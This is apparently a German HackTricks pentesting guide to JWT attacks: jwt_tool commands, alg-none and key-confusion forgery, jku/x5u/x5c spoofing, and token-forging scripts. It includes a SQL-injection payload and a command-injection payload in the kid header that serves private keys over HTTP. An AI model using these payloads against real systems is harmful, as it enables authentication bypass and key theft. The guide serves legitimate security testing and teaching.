# JWT-Schwachstellen (Json Web Tokens)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories** senden.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug-Bounty-Tipp**: **Registrieren Sie sich** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde**! Treten Sie uns noch heute unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und verdienen Sie Pr√§mien von bis zu **100.000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Ein Teil dieses Beitrags basiert auf dem gro√üartigen Beitrag:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor des gro√üartigen Tools zum Pentesten von JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Schnelle Erfolge**

F√ºhren Sie [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) im Modus `Alle Tests!` aus und warten Sie auf gr√ºne Zeilen
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Wenn Sie Gl√ºck haben, findet das Tool m√∂glicherweise einen Fall, in dem die Webanwendung das JWT falsch √ºberpr√ºft:

![](<../.gitbook/assets/image (435).png>)

Dann k√∂nnen Sie die Anfrage in Ihrem Proxy suchen oder das verwendete JWT f√ºr diese Anfrage mit dem jwt\_ Tool abrufen:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Daten manipulieren, ohne etwas zu √§ndern

Sie k√∂nnen einfach mit den Daten manipulieren und die Signatur unver√§ndert lassen, um zu √ºberpr√ºfen, ob der Server die Signatur √ºberpr√ºft. Versuchen Sie zum Beispiel, Ihren Benutzernamen in "admin" zu √§ndern.

#### **Wird das Token √ºberpr√ºft?**

Um zu √ºberpr√ºfen, ob die Signatur eines JWT √ºberpr√ºft wird:

- Eine Fehlermeldung deutet auf eine laufende √úberpr√ºfung hin; sensible Details in ausf√ºhrlichen Fehlern sollten √ºberpr√ºft werden.
- Eine √Ñnderung in der zur√ºckgegebenen Seite deutet ebenfalls auf eine √úberpr√ºfung hin.
- Keine √Ñnderung deutet darauf hin, dass keine √úberpr√ºfung stattfindet; dies ist der Zeitpunkt, um mit der Manipulation der Payload-Claims zu experimentieren.

### Herkunft

Es ist wichtig festzustellen, ob das Token serverseitig oder clientseitig generiert wurde, indem man die Anforderungshistorie des Proxys untersucht.

- Tokens, die zuerst clientseitig gesehen werden, deuten darauf hin, dass der Schl√ºssel m√∂glicherweise dem clientseitigen Code ausgesetzt ist und weitere Untersuchungen erforderlich sind.
- Tokens, die serverseitig generiert werden, deuten auf einen sicheren Prozess hin.

### Dauer

√úberpr√ºfen Sie, ob das Token l√§nger als 24 Stunden g√ºltig ist... vielleicht verf√§llt es nie. Wenn ein "exp"-Feld vorhanden ist, √ºberpr√ºfen Sie, ob der Server es korrekt behandelt.

### Brute-Force HMAC-Schl√ºssel

[**Siehe diese Seite.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### √Ñndern des Algorithmus auf None (CVE-2015-9235)

Setzen Sie den verwendeten Algorithmus auf "None" und entfernen Sie den Signaturteil.

Verwenden Sie die Burp-Erweiterung "JSON Web Token", um diese Schwachstelle auszunutzen und verschiedene Werte innerhalb des JWT zu √§ndern (senden Sie die Anfrage an Repeater und im Tab "JSON Web Token" k√∂nnen Sie die Werte des Tokens √§ndern. Sie k√∂nnen auch den Wert des Feldes "Alg" auf "None" setzen).

### √Ñndern des Algorithmus von RS256(asymmetrisch) auf HS256(symmetrisch) (CVE-2016-5431/CVE-2016-10555)

Der Algorithmus HS256 verwendet den geheimen Schl√ºssel, um jede Nachricht zu signieren und zu √ºberpr√ºfen.\
Der Algorithmus RS256 verwendet den privaten Schl√ºssel, um die Nachricht zu signieren, und verwendet den √∂ffentlichen Schl√ºssel zur Authentifizierung.

Wenn Sie den Algorithmus von RS256 auf HS256 √§ndern, verwendet der Backend-Code den √∂ffentlichen Schl√ºssel als geheimen Schl√ºssel und verwendet dann den HS256-Algorithmus zur √úberpr√ºfung der Signatur.

Dann k√∂nnten wir mit dem √∂ffentlichen Schl√ºssel und der √Ñnderung von RS256 auf HS256 eine g√ºltige Signatur erstellen. Sie k√∂nnen das Zertifikat des Webservers abrufen, indem Sie Folgendes ausf√ºhren:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Neuer √∂ffentlicher Schl√ºssel im Header

Ein Angreifer f√ºgt einen neuen Schl√ºssel im Header des Tokens ein und der Server verwendet diesen neuen Schl√ºssel zur √úberpr√ºfung der Signatur (CVE-2018-0114).

Dies kann mit der "JSON Web Tokens" Burp-Erweiterung durchgef√ºhrt werden.\
(Senden Sie die Anfrage an den Repeater, w√§hlen Sie im JSON Web Token-Tab "CVE-2018-0114" aus und senden Sie die Anfrage).

### JWKS-Spoofing

Die Anweisungen beschreiben eine Methode zur Bewertung der Sicherheit von JWT-Tokens, insbesondere solcher, die eine "jku"-Header-Angabe verwenden. Diese Angabe sollte auf eine JWKS (JSON Web Key Set)-Datei verweisen, die den √∂ffentlichen Schl√ºssel enth√§lt, der zur √úberpr√ºfung des Tokens erforderlich ist.

- **Bewertung von Tokens mit "jku"-Header**:
- √úberpr√ºfen Sie die URL der "jku"-Angabe, um sicherzustellen, dass sie zur entsprechenden JWKS-Datei f√ºhrt.
- √Ñndern Sie den Wert des "jku"-Tokens so, dass er auf einen kontrollierten Webdienst verweist, der die Beobachtung des Datenverkehrs erm√∂glicht.

- **√úberwachung der HTTP-Interaktion**:
- Die Beobachtung von HTTP-Anfragen an die angegebene URL zeigt die Versuche des Servers, Schl√ºssel von Ihrem bereitgestellten Link abzurufen.
- Bei der Verwendung von `jwt_tool` f√ºr diesen Prozess ist es wichtig, die Datei `jwtconf.ini` mit dem Standort Ihres pers√∂nlichen JWKS zu aktualisieren, um die Tests zu erleichtern.

- **Befehl f√ºr `jwt_tool`**:
- F√ºhren Sie den folgenden Befehl aus, um das Szenario mit `jwt_tool` zu simulieren:
```bash
python3 jwt_tool.py JWT_HIER -X s
```

### √úbersicht √ºber Kid-Probleme

Eine optionale Header-Angabe namens `kid` wird verwendet, um einen bestimmten Schl√ºssel zu identifizieren, was insbesondere in Umgebungen mit mehreren Schl√ºsseln zur √úberpr√ºfung der Token-Signatur wichtig ist. Diese Angabe hilft bei der Auswahl des geeigneten Schl√ºssels zur √úberpr√ºfung der Signatur eines Tokens.

#### Offenlegung des Schl√ºssels durch "kid"

Wenn die `kid`-Angabe im Header vorhanden ist, wird empfohlen, das Webverzeichnis nach der entsprechenden Datei oder ihren Variationen zu durchsuchen. Wenn beispielsweise `"kid":"key/12345"` angegeben ist, sollten die Dateien _/key/12345_ und _/key/12345.pem_ im Webstammverzeichnis gesucht werden.

#### Pfadtraversierung mit "kid"

Die `kid`-Angabe kann auch ausgenutzt werden, um durch das Dateisystem zu navigieren und m√∂glicherweise die Auswahl einer beliebigen Datei zu erm√∂glichen. Es ist m√∂glich, die Konnektivit√§t zu testen oder Server-seitige Request Forgery (SSRF)-Angriffe auszuf√ºhren, indem der Wert von `kid` ge√§ndert wird, um bestimmte Dateien oder Dienste anzugreifen. Das Manipulieren des JWT, um den Wert von `kid` zu √§ndern und gleichzeitig die urspr√ºngliche Signatur beizubehalten, kann mithilfe des `-T`-Flags in jwt_tool erreicht werden, wie im folgenden Beispiel gezeigt:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Durch das Zielen auf Dateien mit vorhersehbarem Inhalt ist es m√∂glich, ein g√ºltiges JWT zu f√§lschen. Zum Beispiel kann die Datei `/proc/sys/kernel/randomize_va_space` in Linux-Systemen, die den Wert **2** enth√§lt, im `kid`-Parameter mit **2** als symmetrisches Passwort f√ºr die JWT-Erzeugung verwendet werden.

#### SQL-Injection √ºber "kid"

Wenn der Inhalt der `kid`-Claim verwendet wird, um ein Passwort aus einer Datenbank abzurufen, kann eine SQL-Injection erleichtert werden, indem das `kid`-Payload modifiziert wird. Ein Beispiel-Payload, der SQL-Injection verwendet, um den JWT-Signierungsprozess zu √§ndern, lautet:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Diese √Ñnderung zwingt zur Verwendung eines bekannten geheimen Schl√ºssels, `ATTACKER`, zur JWT-Signierung.

#### OS-Injection √ºber "kid"

Ein Szenario, in dem der `kid`-Parameter einen Dateipfad angibt, der in einem Befehlsausf√ºhrungskontext verwendet wird, kann zu Remote Code Execution (RCE)-Sicherheitsl√ºcken f√ºhren. Durch das Einschleusen von Befehlen in den `kid`-Parameter ist es m√∂glich, private Schl√ºssel offenzulegen. Ein Beispiel-Payload zur Erzielung von RCE und Schl√ºsseloffenlegung lautet:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u und jku

#### jku

jku steht f√ºr **JWK Set URL**.\
Wenn das Token eine "**jku**" **Header**-Claim verwendet, **√ºberpr√ºfen Sie die angegebene URL**. Diese sollte auf eine URL verweisen, die die JWKS-Datei enth√§lt, die den √∂ffentlichen Schl√ºssel zur √úberpr√ºfung des Tokens enth√§lt. Manipulieren Sie das Token, um den jku-Wert auf einen Webdienst zu verweisen, f√ºr den Sie den Datenverkehr √ºberwachen k√∂nnen.

Zuerst m√ºssen Sie ein neues Zertifikat mit neuen privaten und √∂ffentlichen Schl√ºsseln erstellen.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Dann k√∂nnen Sie zum Beispiel [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter jku auf das erstellte Zertifikat zu verweisen**. Um ein g√ºltiges jku-Zertifikat zu erstellen, k√∂nnen Sie das Original herunterladen und die erforderlichen Parameter √§ndern.

Sie k√∂nnen die Parameter "e" und "n" aus einem √∂ffentlichen Zertifikat mit folgendem Befehl erhalten:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509-URL. Eine URI, die auf einen Satz von X.509 (ein Zertifikatformatstandard) √∂ffentlichen Zertifikaten im PEM-Format verweist. Das erste Zertifikat in der Sammlung muss dasjenige sein, das zum Signieren dieses JWT verwendet wird. Die nachfolgenden Zertifikate signieren jeweils das vorherige, wodurch die Zertifikatskette vervollst√§ndigt wird. X.509 ist in RFC 52807 definiert. Der Transport von Zertifikaten erfordert eine sichere √úbertragung.

Versuchen Sie, **diesen Header in eine URL unter Ihrer Kontrolle zu √§ndern** und pr√ºfen Sie, ob eine Anfrage empfangen wird. In diesem Fall **k√∂nnten Sie das JWT manipulieren**.

Um ein neues Token mit einem von Ihnen kontrollierten Zertifikat zu f√§lschen, m√ºssen Sie das Zertifikat erstellen und die √∂ffentlichen und privaten Schl√ºssel extrahieren:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Dann k√∂nnen Sie zum Beispiel [**jwt.io**](https://jwt.io) verwenden, um das neue JWT mit den **erstellten √∂ffentlichen und privaten Schl√ºsseln zu erstellen und den Parameter x5u auf das erstellte Zertifikat .crt zu verweisen**.

![](<../.gitbook/assets/image (439).png>)

Sie k√∂nnen auch beide dieser Schwachstellen **f√ºr SSRFs missbrauchen**.

#### x5c

Dieser Parameter kann das **Zertifikat im Base64-Format** enthalten:

![](<../.gitbook/assets/image (440).png>)

Wenn der Angreifer ein **selbstsigniertes Zertifikat generiert** und ein gef√§lschtes Token mit dem entsprechenden privaten Schl√ºssel erstellt und den Wert des Parameters "x5c" durch das neu generierte Zertifikat ersetzt und die anderen Parameter, n√§mlich n, e und x5t, modifiziert, w√ºrde das gef√§lschte Token im Wesentlichen vom Server akzeptiert werden.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Eingebetteter √∂ffentlicher Schl√ºssel (CVE-2018-0114)

Wenn das JWT einen eingebetteten √∂ffentlichen Schl√ºssel enth√§lt, wie im folgenden Szenario:

![](<../.gitbook/assets/image (438).png>)

Mit dem folgenden Node.js-Skript ist es m√∂glich, einen √∂ffentlichen Schl√ºssel aus diesen Daten zu generieren:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es ist m√∂glich, einen neuen privaten/√∂ffentlichen Schl√ºssel zu generieren, den neuen √∂ffentlichen Schl√ºssel im Token einzubetten und ihn zur Generierung einer neuen Signatur zu verwenden:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Sie k√∂nnen das "n" und "e" mit diesem Node.js-Skript erhalten:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Schlie√ülich k√∂nnen Sie mithilfe des √∂ffentlichen und privaten Schl√ºssels sowie der neuen "n" und "e" Werte [jwt.io](https://jwt.io) verwenden, um ein neues g√ºltiges JWT mit beliebigen Informationen zu f√§lschen.

### JTI (JWT ID)

Die JTI (JWT ID) Behauptung liefert eine eindeutige Kennung f√ºr ein JWT-Token. Sie kann verwendet werden, um das Token vor Wiedergabeangriffen zu sch√ºtzen.\
Stellen Sie sich jedoch eine Situation vor, in der die maximale L√§nge der Kennung 4 betr√§gt (0001-9999). Die Anfragen 0001 und 10001 verwenden dieselbe Kennung. Wenn der Backend-Server die Kennung bei jeder Anfrage inkrementiert, k√∂nnen Sie dies missbrauchen, um eine Anfrage zu **wiederholen** (es sind 10000 Anfragen zwischen jeder erfolgreichen Wiederholung erforderlich).

### JWT Registrierte Behauptungen

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Weitere Angriffe

**Cross-Service Relay-Angriffe**

Es wurde beobachtet, dass einige Webanwendungen auf einen vertrauensw√ºrdigen JWT-Dienst f√ºr die Generierung und Verwaltung ihrer Tokens angewiesen sind. Es wurden F√§lle dokumentiert, in denen ein Token, das f√ºr einen Client vom JWT-Dienst generiert wurde, von einem anderen Client desselben JWT-Dienstes akzeptiert wurde. Wenn die Ausstellung oder Verl√§ngerung eines JWT √ºber einen Drittanbieterdienst beobachtet wird, sollte die M√∂glichkeit untersucht werden, sich mit demselben Benutzernamen/E-Mail auf einem anderen Client dieses Dienstes anzumelden. Es sollte dann versucht werden, das erhaltene Token in einer Anfrage an das Ziel zu wiederholen, um zu sehen, ob es akzeptiert wird.

- Die Akzeptanz Ihres Tokens kann auf ein kritisches Problem hinweisen, das m√∂glicherweise das Spoofing eines beliebigen Benutzerkontos erm√∂glicht. Es sollte jedoch beachtet werden, dass m√∂glicherweise eine Genehmigung f√ºr umfangreichere Tests erforderlich ist, wenn Sie sich bei einer Drittanbieteranwendung anmelden, da dies in einer rechtlichen Grauzone liegen k√∂nnte.

**√úberpr√ºfung des Ablaufs von Tokens**

Der Ablauf des Tokens wird mithilfe der "exp" Payload-Behauptung √ºberpr√ºft. Da JWTs h√§ufig ohne Sitzungsinformationen verwendet werden, ist eine sorgf√§ltige Handhabung erforderlich. In vielen F√§llen k√∂nnte das Erfassen und Wiederholen eines JWT eines anderen Benutzers eine √úbernahme dieses Benutzers erm√∂glichen. Der JWT RFC empfiehlt, JWT-Wiederholungsangriffe zu verhindern, indem die "exp" Behauptung verwendet wird, um eine Ablaufzeit f√ºr das Token festzulegen. Dar√ºber hinaus ist die Implementierung entsprechender √úberpr√ºfungen durch die Anwendung erforderlich, um die Verarbeitung dieses Werts sicherzustellen und abgelaufene Tokens abzulehnen. Wenn das Token eine "exp" Behauptung enth√§lt und die Testzeitlimits dies zulassen, wird empfohlen, das Token zu speichern und es nach Ablauf der Ablaufzeit erneut zu verwenden. Der Inhalt des Tokens, einschlie√ülich der Analyse des Zeitstempels und der √úberpr√ºfung des Ablaufs (Zeitstempel in UTC), kann mithilfe der -R-Flagge von jwt_tool gelesen werden.

- Ein Sicherheitsrisiko kann vorliegen, wenn die Anwendung das Token immer noch validiert, da dies darauf hindeuten kann, dass das Token niemals abl√§uft.


### Tools

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug-Bounty-Tipp**: **Melden Sie sich bei Intigriti an**, einer Premium-Bug-Bounty-Plattform, die von Hackern f√ºr Hacker entwickelt wurde! Treten Sie noch heute unter [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und verdienen Sie Pr√§mien von bis zu **100.000 $**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
